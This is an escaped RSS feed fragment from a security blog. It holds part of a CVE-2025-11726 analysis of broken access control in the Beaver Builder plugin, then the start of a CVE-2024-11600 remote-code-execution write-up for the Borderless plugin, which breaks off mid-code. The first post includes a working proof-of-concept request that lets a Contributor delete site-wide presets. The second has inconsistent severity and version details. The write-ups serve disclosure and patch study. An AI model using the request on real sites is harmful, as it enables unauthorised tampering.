class=&#34;nv&#34;&gt;$presets&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$new_presets&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;k&#34;&gt;return&lt;/span&gt;&amp;ensp;&lt;span class=&#34;k&#34;&gt;new&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nx&#34;&gt;WP_REST_Response&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;s1&#34;&gt;&amp;#39;presets&amp;#39;&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;=&amp;gt;&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$presets&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;p&#34;&gt;],&lt;/span&gt;&amp;ensp;&lt;span class=&#34;mi&#34;&gt;200&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;h2 class=&#34;heading-element&#34; id=&#34;flow&#34;&gt;&lt;span&gt;Flow&lt;/span&gt;&#xD;&#xA;  &lt;a href=&#34;#flow&#34; class=&#34;heading-mark&#34;&gt;&#xD;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xD;&#xA;  &lt;/a&gt;&#xD;&#xA;&lt;/h2&gt;&lt;pre class=&#34;mermaid&#34;&gt;&#xD;&#xA;graph&amp;ensp;TD&#xD;&#xA;A[&#34;Authenticated&amp;ensp;user&amp;ensp;(Contributor&amp;ensp;or&amp;ensp;higher)&#34;]&#xD;&#xA;--&gt;&amp;ensp;B[&#34;Sends&amp;ensp;request&amp;ensp;to&amp;ensp;/wp-json/fl-controls/v1/*&#34;]&#xD;&#xA;--&gt;&amp;ensp;C[&#34;REST&amp;ensp;API&amp;ensp;calls&amp;ensp;permission_callback&amp;ensp;=&amp;ensp;check_permission()&#34;]&#xD;&#xA;--&gt;&amp;ensp;D[&#34;check_permission()&amp;ensp;→&amp;ensp;current_user_can(&#39;builder_access&#39;)&#34;]&#xD;&#xA;--&gt;&amp;ensp;G[&#34;builder_access&amp;ensp;=&amp;ensp;true&amp;ensp;for&amp;ensp;Contributor&#34;]&#xD;&#xA;--&gt;&amp;ensp;H[&#34;Request&amp;ensp;is&amp;ensp;accepted&#34;]&#xD;&#xA;--&gt;&amp;ensp;I[&#34;set_color_presets&amp;ensp;/&amp;ensp;delete_color_presets&amp;ensp;/&amp;ensp;set_background_presets&#34;]&#xD;&#xA;--&gt;&amp;ensp;J[&#34;Global&amp;ensp;Presets&amp;ensp;are&amp;ensp;added&amp;ensp;/&amp;ensp;modified&amp;ensp;/&amp;ensp;deleted&amp;ensp;site-wide&#34;]&#xD;&#xA;&lt;/pre&gt;&lt;/div&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;proof-of-concept-poc&#34;&gt;&lt;span&gt;Proof of Concept (PoC)&lt;/span&gt;&#xD;&#xA;  &lt;a href=&#34;#proof-of-concept-poc&#34; class=&#34;heading-mark&#34;&gt;&#xD;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xD;&#xA;  &lt;/a&gt;&#xD;&#xA;&lt;/h2&gt;&lt;ol&gt;&#xA;&lt;li&gt;Login with a Contributor account.&lt;/li&gt;&#xA;&lt;li&gt;Obtain nonce by pasting the following in the browser console:&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&#xA;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-js&#34; data-lang=&#34;js&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nx&#34;&gt;wpApiSettings&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;nonce&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;ol start=&#34;3&#34;&gt;&#xA;&lt;li&gt;Add the X-WP-Nonce header and send the request:&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&#xA;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-http&#34; data-lang=&#34;http&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nf&#34;&gt;POST&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nn&#34;&gt;/wp-json/fl-controls/v1/color_presets/&lt;/span&gt;&amp;ensp;&lt;span class=&#34;kr&#34;&gt;HTTP&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;m&#34;&gt;1.1&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;Cookie&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;:&lt;/span&gt;&amp;ensp;&lt;span class=&#34;l&#34;&gt;contributor_cookie&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;X-WP-Nonce&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;:&lt;/span&gt;&amp;ensp;&lt;span class=&#34;l&#34;&gt;0db9546893&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;g&#34;&gt;{&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;g&#34;&gt;&amp;ensp;&amp;ensp;&amp;#34;clearPresets&amp;#34;:&amp;ensp;true&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;g&#34;&gt;}&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Repeat similarly for the other endpoints.&lt;/p&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;conclusion&#34;&gt;&lt;span&gt;Conclusion&lt;/span&gt;&#xD;&#xA;  &lt;a href=&#34;#conclusion&#34; class=&#34;heading-mark&#34;&gt;&#xD;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xD;&#xA;  &lt;/a&gt;&#xD;&#xA;&lt;/h2&gt;&lt;p&gt;CVE-2025-11726 is a &lt;strong&gt;Broken Access Control&lt;/strong&gt; issue caused by the plugin only checking the internal &lt;code&gt;builder_access&lt;/code&gt; permission — which by default applies to roles with &lt;code&gt;edit_posts&lt;/code&gt; (i.e., &lt;strong&gt;Contributor and above&lt;/strong&gt;). Therefore, merely logging in allows an attacker to &lt;strong&gt;add, modify, or delete Global Presets&lt;/strong&gt; via the &lt;code&gt;fl-controls/v1&lt;/code&gt; REST API, affecting all Beaver Builder content site-wide.&lt;/p&gt;&#xA;&lt;p&gt;The patch in &lt;strong&gt;v2.9.4.1&lt;/strong&gt; fixes this by replacing &lt;code&gt;check_permission&lt;/code&gt; with &lt;code&gt;check_write_permission&lt;/code&gt;, requiring &lt;strong&gt;both&lt;/strong&gt; &lt;code&gt;builder_access&lt;/code&gt; and &lt;code&gt;unrestricted_editing&lt;/code&gt;, and limiting it to &lt;strong&gt;Editor and Administrator&lt;/strong&gt; roles.&lt;/p&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;key-takeaways&#34;&gt;&lt;span&gt;Key Takeaways&lt;/span&gt;&#xD;&#xA;  &lt;a href=&#34;#key-takeaways&#34; class=&#34;heading-mark&#34;&gt;&#xD;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xD;&#xA;  &lt;/a&gt;&#xD;&#xA;&lt;/h2&gt;&lt;ul&gt;&#xA;&lt;li&gt;Authentication ≠ Authorization&lt;/li&gt;&#xA;&lt;li&gt;Avoid using &lt;strong&gt;default = all&lt;/strong&gt; for sensitive permissions&lt;/li&gt;&#xA;&lt;li&gt;Custom permissions should map correctly to &lt;strong&gt;WordPress core capabilities&lt;/strong&gt;&lt;/li&gt;&#xA;&lt;li&gt;Endpoints that modify &lt;strong&gt;global settings&lt;/strong&gt; must require high privileges (Admin/Editor)&lt;/li&gt;&#xA;&lt;li&gt;Comparing (diff) vulnerable vs patched versions is a quick way to spot permission logic errors&lt;/li&gt;&#xA;&lt;li&gt;Multiple layers of permission checks are needed for critical actions&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;references&#34;&gt;&lt;span&gt;References&lt;/span&gt;&#xD;&#xA;  &lt;a href=&#34;#references&#34; class=&#34;heading-mark&#34;&gt;&#xD;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xD;&#xA;  &lt;/a&gt;&#xD;&#xA;&lt;/h2&gt;&lt;p&gt;&lt;a href=&#34;https://patchstack.com/academy/wordpress/vulnerabilities/broken-access-control/&#34;target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;Broken Access Control&lt;/a&gt;&lt;/p&gt;&#xA;&lt;p&gt;&lt;a href=&#34;https://patchstack.com/database/wordpress/plugin/beaver-builder-lite-version/vulnerability/wordpress-beaver-builder-wordpress-page-builder-plugin-2-9-4-missing-authorization-to-authenticated-contributor-global-preset-modification-vulnerability&#34;target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;WordPress Beaver Builder Plugin &amp;lt;= 2.9.4 is vulnerable to Broken Access Control&lt;/a&gt;&lt;/p&gt;</description>
    </item>
    <item>
      <title>CVE-2024-11600 Analysis &amp; POC</title>
      <link>http://localhost:1313/posts/2025-12-06-cve-2024-11600/</link>
      <pubDate>Sat, 06 Dec 2025 19:00:00 +0700</pubDate><author>w41bu1@gmail.com (Bui Van Y)</author>
      <guid>http://localhost:1313/posts/2025-12-06-cve-2024-11600/</guid>
      <category domain="http://localhost:1313/categories/cve-analysis/">CVE Analysis</category>
      <description>&lt;img src=&#34;http://localhost:1313/posts/2025-12-06-cve-2024-11600/app.png&#34; alt=&#34;featured image&#34; referrerpolicy=&#34;no-referrer&#34;&gt;&lt;h2 class=&#34;heading-element&#34; id=&#34;cve--basic-info&#34;&gt;&lt;span&gt;CVE &amp;amp; Basic Info&lt;/span&gt;&#xD;&#xA;  &lt;a href=&#34;#cve--basic-info&#34; class=&#34;heading-mark&#34;&gt;&#xD;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xD;&#xA;  &lt;/a&gt;&#xD;&#xA;&lt;/h2&gt;&lt;p&gt;The WordPress plugin &lt;strong&gt;The Borderless – Widgets, Elements, Templates and Toolkit for Elementor &amp;amp; Gutenberg&lt;/strong&gt; contains a &lt;strong&gt;Remote Code Execution&lt;/strong&gt; vulnerability in all versions up to and including &lt;strong&gt;1.5.9&lt;/strong&gt; via the &lt;strong&gt;write_config&lt;/strong&gt; function. The root cause is improper &lt;strong&gt;sanitization&lt;/strong&gt; of an imported &lt;strong&gt;JSON&lt;/strong&gt; file. This allows an authenticated attacker with &lt;strong&gt;Administrator-level access&lt;/strong&gt; or higher to execute code on the server.&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;strong&gt;CVE ID&lt;/strong&gt;: &lt;a href=&#34;https://www.cve.org/CVERecord?id=CVE-2024-11600&#34;target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;CVE-2024-11600&lt;/a&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Vulnerability Type&lt;/strong&gt;: Remote Code Execution&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Affected Versions&lt;/strong&gt;: &amp;lt;= 1.6.0&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Patched Versions&lt;/strong&gt;: 1.6.1&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;CVSS severity&lt;/strong&gt;: Low (9.1)&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Required Privilege&lt;/strong&gt;: Administrator&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Product&lt;/strong&gt;: &lt;a href=&#34;https://wordpress.org/plugins/borderless/&#34;target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;WordPress Borderless Plugin&lt;/a&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;requirements&#34;&gt;&lt;span&gt;Requirements&lt;/span&gt;&#xD;&#xA;  &lt;a href=&#34;#requirements&#34; class=&#34;heading-mark&#34;&gt;&#xD;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xD;&#xA;  &lt;/a&gt;&#xD;&#xA;&lt;/h2&gt;&lt;ul&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;&lt;strong&gt;Local WordPress &amp;amp; Debugging&lt;/strong&gt;&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;a href=&#34;https://w41bu1.github.io/posts/2025-08-21-wordpress-local-and-debugging/&#34;target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;Virtual Machine&lt;/a&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;a href=&#34;https://w41bu1.github.io/posts/2025-10-22-wordpress-local-and-debugging-docker/&#34;target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;Docker&lt;/a&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;&lt;strong&gt;Plugin Version – Borderless&lt;/strong&gt;:&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;code&gt;1.6.0&lt;/code&gt; – &lt;strong&gt;vulnerable&lt;/strong&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;code&gt;1.6.1&lt;/code&gt; – &lt;strong&gt;patched&lt;/strong&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;&lt;strong&gt;Diff Tool (diff)&lt;/strong&gt; → &lt;a href=&#34;https://meldmerge.org/&#34;target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;&lt;strong&gt;Meld&lt;/strong&gt;&lt;/a&gt; or any other diff tool.&lt;/p&gt;&#xA;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;cause&#34;&gt;&lt;span&gt;Cause&lt;/span&gt;&#xD;&#xA;  &lt;a href=&#34;#cause&#34; class=&#34;heading-mark&#34;&gt;&#xD;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xD;&#xA;  &lt;/a&gt;&#xD;&#xA;&lt;/h2&gt;&lt;p&gt;&lt;strong&gt;In the vulnerable version (v1.6.0):&lt;/strong&gt;&lt;/p&gt;&#xA;&#xA;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;k&#34;&gt;function&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nf&#34;&gt;write_config&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;()&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$charmap&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$this&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;paths&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;tempdir&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&amp;ensp;&lt;span class=&#34;s1&#34;&gt;&amp;#39;/&amp;#39;&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$this&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;paths&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;config&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;];&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$handle&lt;/span&gt;&amp;ensp;&amp;ensp;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;@&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;fopen&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$charmap&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&amp;ensp;&lt;span class=&#34;s1&#34;&gt;&amp;#39;w&amp;#39;&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;k&#34;&gt;if&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$handle&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;nx&#34;&gt;fwrite&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$handle&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&amp;ensp;&lt;span class=&#34;s1&#34;&gt;&amp;#39;&amp;lt;?php&amp;ensp;$icons&amp;ensp;=&amp;ensp;array();&amp;#39;&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span 